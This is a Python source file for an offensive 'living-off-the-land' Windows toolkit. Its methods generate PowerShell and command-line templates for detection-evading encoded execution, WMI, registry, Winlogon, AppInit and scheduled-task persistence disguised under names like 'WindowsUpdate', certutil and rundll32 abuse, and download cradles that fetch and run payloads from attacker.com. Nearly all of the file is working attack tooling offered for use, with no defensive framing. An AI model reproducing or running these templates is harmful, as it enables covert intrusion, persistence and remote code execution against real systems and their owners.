import subprocess
import base64
import os
from typing import Dict, List

class LivingOffTheLand:
    """Living-off-the-land toolkit - use only built-in Windows tools."""
    
    def __init__(self):
        self.tools = {
            'powershell': 'powershell.exe',
            'wmic': 'wmic.exe',
            'reg': 'reg.exe',
            'schtasks': 'schtasks.exe',
            'certutil': 'certutil.exe',
            'rundll32': 'rundll32.exe',
            'mshta': 'mshta.exe',
            'wscript': 'wscript.exe',
            'cscript': 'cscript.exe'
        }
    
    def generate_powershell_stealth(self, command: str) -> str:
        """Generate stealthy PowerShell execution."""
        
        # Encode command to avoid detection
        encoded_cmd = base64.b64encode(command.encode('utf-16le')).decode()
        
        powershell_stealth = f'''
# Living-off-the-land PowerShell execution
# Uses only built-in Windows tools

# Method 1: Encoded command execution
$encoded = "{encoded_cmd}"
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Method 2: IEX with download cradle
# IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Method 3: WMI execution
# $wmi = Get-WmiObject -Class Win32_Process -EnableAllPrivileges
# $wmi.Create("cmd.exe /c {command}")

# Method 4: COM object execution
# $com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("WScript.Shell"))
# $com.Run("{command}", 0, $false)
'''
        
        return powershell_stealth
    
    def generate_wmi_persistence(self, payload: str) -> str:
        """Generate WMI-based persistence."""
        
        wmi_persistence = f'''
# WMI-based persistence (living-off-the-land)
# Uses only built-in Windows tools

# Create WMI event filter
$filter = Get-WmiObject -Class __EventFilter -Namespace root\\subscription -List
$filter = New-Object -ComObject ("WbemScripting.SWbemFilter")
$filter.EventNameSpace = "root\\cimv2"
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
$filter.Put_()

# Create WMI event consumer
$consumer = Get-WmiObject -Class __EventConsumer -Namespace root\\subscription -List
$consumer = New-Object -ComObject ("WbemScripting.SWbemConsumer")
$consumer.Name = "PersistenceConsumer"
$consumer.CommandLineTemplate = "{payload}"
$consumer.Put_()

# Bind filter to consumer
$binding = Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\\subscription -List
$binding = New-Object -ComObject ("WbemScripting.SWbemFilterToConsumerBinding")
$binding.Filter = $filter
$binding.Consumer = $consumer
$binding.Put_()

Write-Host "WMI persistence installed successfully"
'''
        
        return wmi_persistence
    
    def generate_registry_persistence(self, payload: str) -> str:
        """Generate registry-based persistence."""
        
        registry_persistence = f'''
# Registry-based persistence (living-off-the-land)
# Uses only built-in Windows tools

# Method 1: Run key persistence
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "{payload}" /f

# Method 2: RunOnce key
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "SystemCheck" /t REG_SZ /d "{payload}" /f

# Method 3: Winlogon shell
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,{payload}" /f

# Method 4: AppInit DLLs
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs" /t REG_SZ /d "malicious.dll" /f

# Method 5: Image File Execution Options
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v "Debugger" /t REG_SZ /d "{payload}" /f

Write-Host "Registry persistence installed successfully"
'''
        
        return registry_persistence
    
    def generate_schtasks_persistence(self, payload: str) -> str:
        """Generate scheduled task persistence."""
        
        schtasks_persistence = f'''
# Scheduled Task persistence (living-off-the-land)
# Uses only built-in Windows tools

# Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "{payload}" /sc onlogon /ru "SYSTEM" /f

# Alternative: Create task with XML
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{payload}</Command>
    </Exec>
  </Actions>
</Task>
"@

$xml | Out-File -FilePath "C:\\temp\\task.xml" -Encoding Unicode
schtasks /create /tn "SystemMaintenance" /xml "C:\\temp\\task.xml" /f

Write-Host "Scheduled task persistence installed successfully"
'''
        
        return schtasks_persistence
    
    def generate_com_execution(self, payload: str) -> str:
        """Generate COM object execution."""
        
        com_execution = f'''
# COM object execution (living-off-the-land)
# Uses only built-in Windows tools

# Method 1: WScript.Shell
$shell = New-Object -ComObject WScript.Shell
$shell.Run("{payload}", 0, $false)

# Method 2: Shell.Application
$app = New-Object -ComObject Shell.Application
$app.ShellExecute("{payload}")

# Method 3: InternetExplorer.Application
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $false
$ie.Navigate("file:///{payload}")

# Method 4: MSXML2.XMLHTTP
$xmlhttp = New-Object -ComObject MSXML2.XMLHTTP
$xmlhttp.Open("GET", "http://attacker.com/payload", $false)
$xmlhttp.Send()
$payload = $xmlhttp.ResponseText
Invoke-Expression $payload

# Method 5: Excel.Application
$excel = New-Object -ComObject Excel.Application
$excel.Visible = $false
$excel.Run("Macro1")

Write-Host "COM execution completed"
'''
        
        return com_execution
    
    def generate_certutil_download(self, url: str) -> str:
        """Generate certutil-based file download."""
        
        certutil_download = f'''
# Certutil file download (living-off-the-land)
# Uses only built-in Windows tools

# Download file using certutil
certutil -urlcache -split -f "{url}" payload.exe

# Alternative: Download and decode base64
certutil -decode payload.b64 payload.exe

# Alternative: Download and decode hex
certutil -decodehex payload.hex payload.exe

# Alternative: Download and decode URL
certutil -urlcache -split -f "http://attacker.com/payload.b64" payload.b64
certutil -decode payload.b64 payload.exe

Write-Host "File downloaded using certutil"
'''
        
        return certutil_download
    
    def generate_rundll32_execution(self, dll_path: str, function: str) -> str:
        """Generate rundll32 execution."""
        
        rundll32_execution = f'''
# Rundll32 execution (living-off-the-land)
# Uses only built-in Windows tools

# Execute DLL function
rundll32.exe {dll_path},{function}

# Alternative: Execute with parameters
rundll32.exe {dll_path},{function} "param1,param2"

# Alternative: Execute JavaScript via rundll32
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval("var x=new ActiveXObject(\\"WScript.Shell\\");x.Run(\\"{dll_path}\\");")

# Alternative: Execute VBScript via rundll32
rundll32.exe vbscript:"\\..\\mshtml,RunHTMLApplication ";CreateObject("WScript.Shell").Run("{dll_path}")

Write-Host "Rundll32 execution completed"
'''
        
        return rundll32_execution 